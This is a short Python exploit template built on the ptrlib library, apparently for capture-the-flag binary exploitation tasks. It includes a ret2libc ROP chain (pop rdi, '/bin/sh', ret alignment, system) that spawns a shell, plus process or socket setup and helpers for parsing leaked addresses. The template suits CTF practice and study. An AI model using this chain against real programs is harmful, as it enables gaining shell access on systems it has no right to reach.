"""
Template
"""
from ptrlib import *

file = ""
e = ELF(file)
libc = ELF("")
sock = Process(file)
#sock = Socket("")
sock.debug = True

sock.sh()

"""
standard ROP
"""
p64(next(libc.gadget("pop rdi; ret;")))
p64(next(libc.search("/bin/sh\x00")))
p64(next(libc.gadget("ret"))) # alignment
p64(libc.symbol("system"))

"""
.bss section
"""
e.section(".bss")

"""
hex(str) -> int
e.g | 0xdead -> 57005
"""
int(sock.recvline(), 16)

"""
bytes -> int
e.g | \xff\xee
"""
u64(sock.recvline())
